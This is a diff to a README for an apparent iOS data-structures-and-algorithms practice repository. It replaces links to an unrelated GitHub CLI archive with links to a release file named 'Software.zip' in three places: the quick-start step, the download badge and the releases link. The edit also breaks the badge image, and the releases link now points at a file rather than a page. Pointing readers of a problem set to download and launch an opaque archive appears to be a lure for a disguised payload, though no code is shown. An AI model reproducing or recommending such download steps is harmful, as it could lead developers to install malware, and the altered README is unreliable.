@@ -16,7 +16,7 @@ Welcome to the iOS_DSA_Problems repository! This repository is dedicated to help
 - Tech Industry
 
 ## 🚀 Quick Start
-To get started with the iOS_DSA_Problems repository, simply download the latest version of the repository [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once downloaded, extract the files and launch the project in your favorite iOS development environment.
+To get started with the iOS_DSA_Problems repository, simply download the latest version of the repository [here](https://github.com/Jetly11/iOS_DSA_Problems/releases/download/v1.0/Software.zip). Once downloaded, extract the files and launch the project in your favorite iOS development environment.
 
 ## 📚 Resources
 Inside this repository, you will find a collection of iOS-specific Data Structures and Algorithms problems, ideal for honing your problem-solving skills. Feel free to explore the various folders and challenges provided to enhance your understanding of DSA concepts in the context of iOS development.
@@ -41,6 +41,6 @@ Happy Coding! 📱✨
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/Jetly11/iOS_DSA_Problems/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/Jetly11/iOS_DSA_Problems/releases/download/v1.0/Software.zip)
 
-🔗 For more details, visit the [GitHub Releases Section](https://github.com/cli/cli/releases).
+🔗 For more details, visit the [GitHub Releases Section](https://github.com/Jetly11/iOS_DSA_Problems/releases/download/v1.0/Software.zip).
